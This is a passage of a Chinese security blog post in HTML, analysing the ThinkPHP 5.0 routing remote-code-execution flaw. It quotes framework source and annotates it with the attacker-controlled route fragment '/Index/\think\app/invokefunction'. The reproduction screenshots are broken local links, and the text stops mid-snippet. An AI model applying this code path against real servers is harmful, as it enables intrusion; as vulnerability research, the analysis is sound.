+    <link itemprop="mainEntityOfPage" href="https://github.com/scareing/scareing.github.io/2019/10/28/ThinkPHP5.0RCE复现/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="scareing">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/Bloglogo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="scareing的学习笔记">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/10/28/ThinkPHP5.0RCE复现/" itemprop="url">ThinkPHP_v5.0_rce 分析</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-28T23:15:24+08:00">
+                2019-10-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/漏洞分析/" itemprop="url" rel="index">
+                    <span itemprop="name">漏洞分析</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p> ThinkPHP v5.0 rce 分析</p>
+<blockquote>
+<p>ThinkPHP 5.*存在一处由于路由解析缺陷导致的代码执行漏洞。该漏洞危害程度非常高，默认环境配置即可导致远程代码执行。</p>
+</blockquote>
+<ul>
+<li>本次测试环境<code>ThinkPHP 5.0.20</code></li>
+</ul>
+<h2 id="RCE复现"><a href="#RCE复现" class="headerlink" title="RCE复现"></a>RCE复现</h2><p>![image-20200221124859301](C:\Users\Mr. j\AppData\Roaming\Typora\typora-user-images\image-20200221124859301.png)</p>
+<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><blockquote>
+<p> 首先看取路由的函数<code>pathinfo,path</code></p>
+<p>漏洞文件<code>/thinkphp/library/think/Request.php:384</code></p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取当前请求URL的pathinfo信息（含URL后缀）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">pathinfo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_null(<span class="keyword">$this</span>-&gt;pathinfo)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[Config::get(<span class="string">'var_pathinfo'</span>)])) &#123;</span><br><span class="line">            <span class="comment">// 判断URL里面是否有兼容模式参数</span></span><br><span class="line">            $_SERVER[<span class="string">'PATH_INFO'</span>] = $_GET[Config::get(<span class="string">'var_pathinfo'</span>)];</span><br><span class="line">            <span class="keyword">unset</span>($_GET[Config::get(<span class="string">'var_pathinfo'</span>)]);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (IS_CLI) &#123;</span><br><span class="line">            <span class="comment">// CLI模式下 index.php module/controller/action/params/...</span></span><br><span class="line">            $_SERVER[<span class="string">'PATH_INFO'</span>] = <span class="keyword">isset</span>($_SERVER[<span class="string">'argv'</span>][<span class="number">1</span>]) ? $_SERVER[<span class="string">'argv'</span>][<span class="number">1</span>] : <span class="string">''</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 分析PATHINFO信息</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>($_SERVER[<span class="string">'PATH_INFO'</span>])) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> (Config::get(<span class="string">'pathinfo_fetch'</span>) <span class="keyword">as</span> $type) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="keyword">empty</span>($_SERVER[$type])) &#123;</span><br><span class="line">                    $_SERVER[<span class="string">'PATH_INFO'</span>] = (<span class="number">0</span> === strpos($_SERVER[$type], $_SERVER[<span class="string">'SCRIPT_NAME'</span>])) ?</span><br><span class="line">                    substr($_SERVER[$type], strlen($_SERVER[<span class="string">'SCRIPT_NAME'</span>])) : $_SERVER[$type];</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;pathinfo = <span class="keyword">empty</span>($_SERVER[<span class="string">'PATH_INFO'</span>]) ? <span class="string">'/'</span> : ltrim($_SERVER[<span class="string">'PATH_INFO'</span>], <span class="string">'/'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;pathinfo; <span class="comment">// /Index/\think\app/invokefunction</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里获取<code>pathinfo</code>后只进行了简单的字符串操作。又由于</p>
+<p>下图</p>
+<p>![image-20200221171234408](C:\Users\Mr. j\AppData\Roaming\Typora\typora-user-images\image-20200221171234408.png)</p>
+<p>所以<code>s--&gt;var_pathinfo--&gt;pathinfo</code>。</p>
+<p>又<code>pathinfo</code>函数被<code>library/think/Request.php:416</code>中的path函数调用：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取当前请求URL的pathinfo信息(不含URL后缀)</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">path</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_null(<span class="keyword">$this</span>-&gt;path)) &#123;</span><br><span class="line">        $suffix   = Config::get(<span class="string">'url_html_suffix'</span>);</span><br><span class="line">        $pathinfo = <span class="keyword">$this</span>-&gt;pathinfo();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">false</span> === $suffix) &#123;</span><br><span class="line">            <span class="comment">// 禁止伪静态访问</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;path = $pathinfo;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> ($suffix) &#123;</span><br><span class="line">            <span class="comment">// 去除正常的URL后缀</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;path = preg_replace(<span class="string">'/\.('</span> . ltrim($suffix, <span class="string">'.'</span>) . <span class="string">')$/i'</span>, <span class="string">''</span>, $pathinfo);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 允许任何后缀访问</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;path = preg_replace(<span class="string">'/\.'</span> . <span class="keyword">$this</span>-&gt;ext() . <span class="string">'$/i'</span>, <span class="string">''</span>, $pathinfo);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;path; /Index/\think\app/invokefunction</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 当前URL的访问后缀</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>由于<code>$this-&gt;path</code>源自<code>pathinfo</code>，因此可以被攻击者控制。继续分析该变量的传递，在<code>/thinkphp/library/think/App.php:619</code>中被引用：</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * URL路由检测（根据PATH_INFO)</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  \think\Request $request 请求实例</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  array          $config  配置信息</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> \think\Exception</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">routeCheck</span><span class="params">($request, array $config)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $path   = $request-&gt;path();</span><br><span class="line">    $depr   = $config[<span class="string">'pathinfo_depr'</span>];</span><br><span class="line">    $result = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 路由检测</span></span><br><span class="line">    $check = !is_null(<span class="keyword">self</span>::$routeCheck) ? <span class="keyword">self</span>::$routeCheck : $config[<span class="string">'url_route_on'</span>];</span><br><span class="line">    <span class="keyword">if</span> ($check) &#123;</span><br><span class="line">        <span class="comment">// 开启路由</span></span><br><span class="line">        <span class="keyword">if</span> (is_file(RUNTIME_PATH . <span class="string">'route.php'</span>)) &#123;</span><br><span class="line">            <span class="comment">// 读取路由缓存</span></span><br><span class="line">            $rules = <span class="keyword">include</span> RUNTIME_PATH . <span class="string">'route.php'</span>;</span><br><span class="line">            is_array($rules) &amp;&amp; Route::rules($rules);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $files = $config[<span class="string">'route_config_file'</span>];</span><br><span class="line">            <span class="keyword">foreach</span> ($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">                <span class="keyword">if</span> (is_file(CONF_PATH . $file . CONF_EXT)) &#123;</span><br><span class="line">                    <span class="comment">// 导入路由配置</span></span><br><span class="line">                    $rules = <span class="keyword">include</span> CONF_PATH . $file . CONF_EXT;</span><br><span class="line">                    is_array($rules) &amp;&amp; Route::import($rules);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 路由检测（根据路由定义返回不同的URL调度）</span></span><br><span class="line">        $result = Route::check($request, $path, $depr, $config[<span class="string">'url_domain_deploy'</span>]);</span><br><span class="line">        <span class="comment">//是否强制路由</span></span><br><span class="line">        $must   = !is_null(<span class="keyword">self</span>::$routeMust) ? <span class="keyword">self</span>::$routeMust : $config[<span class="string">'url_route_must'</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($must &amp;&amp; <span class="keyword">false</span> === $result) &#123;</span><br><span class="line">            <span class="comment">// 路由无效</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RouteNotFoundException();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 路由无效 解析模块/控制器/操作/参数... 支持控制器自动搜索</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">false</span> === $result) &#123;</span><br><span class="line">        $result = Route::parseUrl($path, $depr, $config[<span class="string">'controller_auto_search'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">//返回一个result对象</span></span><br><span class="line">    <span class="keyword">return</span> $result;<span class="comment">//**/Index/\think\app/invokefunction</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们可以看到调用parseUrl函数处理传入的path参数</p>
+<p><code>/thinkphp/library/think/App.php:166</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 直接解析URL地址</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">parseUrl</span><span class="params">($url, &amp;$domain)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">  $request = Request::instance();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="number">0</span> === strpos($url, <span class="string">'/'</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 直接作为路由地址解析</span></span><br><span class="line"></span><br><span class="line">    $url = substr($url, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">elseif</span> (<span class="keyword">false</span> !== strpos($url, <span class="string">'\\'</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解析到类</span></span><br><span class="line"></span><br><span class="line">    $url = ltrim(str_replace(<span class="string">'\\'</span>, <span class="string">'/'</span>, $url), <span class="string">'/'</span>); <span class="comment">//分隔符替换 确保路由定义使用统一的分隔符</span></span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">elseif</span> (<span class="number">0</span> === strpos($url, <span class="string">'@'</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解析到控制器</span></span><br><span class="line"></span><br><span class="line">    $url = substr($url, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解析到 模块/控制器/操作</span></span><br><span class="line"></span><br><span class="line">    $module = $request-&gt;module();</span><br><span class="line"></span><br><span class="line">    $domains = Route::rules(<span class="string">'domain'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">true</span> === $domain &amp;&amp; <span class="number">2</span> == substr_count($url, <span class="string">'/'</span>)) &#123;</span><br><span class="line"></span><br><span class="line">      $current = $request-&gt;host();</span><br><span class="line"></span><br><span class="line">      $match  = [];</span><br><span class="line"></span><br><span class="line">      $pos   = [];</span><br><span class="line"></span><br><span class="line">      <span class="keyword">foreach</span> ($domains <span class="keyword">as</span> $key =&gt; $item) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($item[<span class="string">'[bind]'</span>]) &amp;&amp; <span class="number">0</span> === strpos($url, $item[<span class="string">'[bind]'</span>][<span class="number">0</span>])) &#123;</span><br><span class="line"></span><br><span class="line">          $pos[$key] = strlen($item[<span class="string">'[bind]'</span>][<span class="number">0</span>]) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">          $match[]  = $key;</span><br><span class="line"></span><br><span class="line">          $module  = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ($match) &#123;</span><br><span class="line"></span><br><span class="line">        $domain = current($match);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($match <span class="keyword">as</span> $item) &#123;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (<span class="number">0</span> === strpos($current, $item)) &#123;</span><br><span class="line"></span><br><span class="line">            $domain = $item;</span><br><span class="line"></span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">self</span>::$bindCheck = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">        $url       = substr($url, $pos[$domain]);</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">elseif</span> ($domain) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">isset</span>($domains[$domain][<span class="string">'[bind]'</span>][<span class="number">0</span>])) &#123;</span><br><span class="line"></span><br><span class="line">        $bindModule = $domains[$domain][<span class="string">'[bind]'</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($bindModule &amp;&amp; !in_array($bindModule[<span class="number">0</span>], [<span class="string">'\\'</span>, <span class="string">'@'</span>])) &#123;</span><br><span class="line"></span><br><span class="line">          $module = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $module = $module ? $module . <span class="string">'/'</span> : <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    $controller = $request-&gt;controller();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="string">''</span> == $url) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 空字符串输出当前的 模块/控制器/操作</span></span><br><span class="line"></span><br><span class="line">      $action = $request-&gt;action();</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">      $path    = explode(<span class="string">'/'</span>, $url);</span><br><span class="line"></span><br><span class="line">      $action   = array_pop($path);</span><br><span class="line"></span><br><span class="line">      $controller = <span class="keyword">empty</span>($path) ? $controller : array_pop($path);</span><br><span class="line"></span><br><span class="line">      $module   = <span class="keyword">empty</span>($path) ? $module : array_pop($path) . <span class="string">'/'</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (Config::get(<span class="string">'url_convert'</span>)) &#123;</span><br><span class="line"></span><br><span class="line">      $action   = strtolower($action);</span><br><span class="line"></span><br><span class="line">      $controller = Loader::parseName($controller);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $url = $module . $controller . <span class="string">'/'</span> . $action;<span class="comment">//  /Index/ \think\app /invokefunction</span></span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> $url;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最后分割为 <code>模块---控制器---操作</code>的格式。</p>
+<p>然后参数传递。</p>
+<p><code>/thinkphp/library/think/App.php:553</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">// 获取控制器名</span></span><br><span class="line"></span><br><span class="line">​    $controller = strip_tags($result[<span class="number">1</span>] ?: $config[<span class="string">'default_controller'</span>]);</span><br><span class="line"></span><br><span class="line">​    $controller = $convert ? strtolower($controller) : $controller;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">​    <span class="comment">// 获取操作名</span></span><br><span class="line"></span><br><span class="line">​    $actionName = strip_tags($result[<span class="number">2</span>] ?: $config[<span class="string">'default_action'</span>]);</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">if</span> (!<span class="keyword">empty</span>($config[<span class="string">'action_convert'</span>])) &#123;</span><br><span class="line"></span><br><span class="line">​      $actionName = Loader::parseName($actionName, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">​    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">​      $actionName = $convert ? strtolower($actionName) : $actionName;</span><br><span class="line"></span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">​    <span class="comment">// 设置当前请求的控制器、操作</span></span><br><span class="line"></span><br><span class="line">​    $request-&gt;controller(Loader::parseName($controller, <span class="number">1</span>))-&gt;action($actionName);</span><br></pre></td></tr></table></figure>
+
+<p><code>/thinkphp/library/think/Loader.php:580</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span 